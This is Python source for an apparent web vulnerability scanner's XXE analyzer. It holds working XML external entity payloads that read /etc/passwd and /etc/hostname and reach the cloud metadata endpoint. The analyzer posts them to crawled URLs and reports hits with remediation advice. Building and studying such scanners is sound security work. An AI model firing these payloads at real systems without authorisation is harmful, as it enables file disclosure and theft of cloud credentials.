from __future__ import annotations

import asyncio

from phantomrecon.analyzers.base import BaseAnalyzer
from phantomrecon.logger import log
from phantomrecon.models.finding import CrawlResult, Finding


class XXEAnalyzer(BaseAnalyzer):
    """XML External Entity injection detection."""

    name = "xxe"
    category = "injection"

    XXE_PAYLOADS = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    ]

    FILE_MARKERS = ["root:x:0:0", "127.0.0.1", "localhost"]

    async def analyze(self, crawl_result: CrawlResult, oob_url: str = "") -> list[Finding]:
        findings: list[Finding] = []
        tasks = [self._test_xxe(url) for url in crawl_result.urls[:50]]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, Finding):
                findings.append(result)
        log.info(f"  [bold]{self.name}:[/] {len(findings)} findings")
        return findings

    async def _test_xxe(self, url: str) -> Finding | None:
        for payload in self.XXE_PAYLOADS:
            try:
                resp = await self.client.post(
                    url,
                    content=payload,
                    headers={"Content-Type": "application/xml"},
                )
                for marker in self.FILE_MARKERS:
                    if marker in resp.text:
                        return self._make_finding(
                            rule_id="XXE-001",
                            name="XML External Entity (XXE)",
                            severity="HIGH",
                            confidence=0.88,
                            url=url,
                            method="POST",
                            parameter="XML body",
                            payload=payload[:200],
                            evidence=f"File content disclosed: {marker}",
                            description="Server processes XML with external entities enabled.",
                            remediation="Disable DTD processing. Use JSON instead of XML. Validate XML input.",
                            cwe="CWE-611",
                            owasp="A05:2021",
                        )
            except Exception:
                continue
        return None
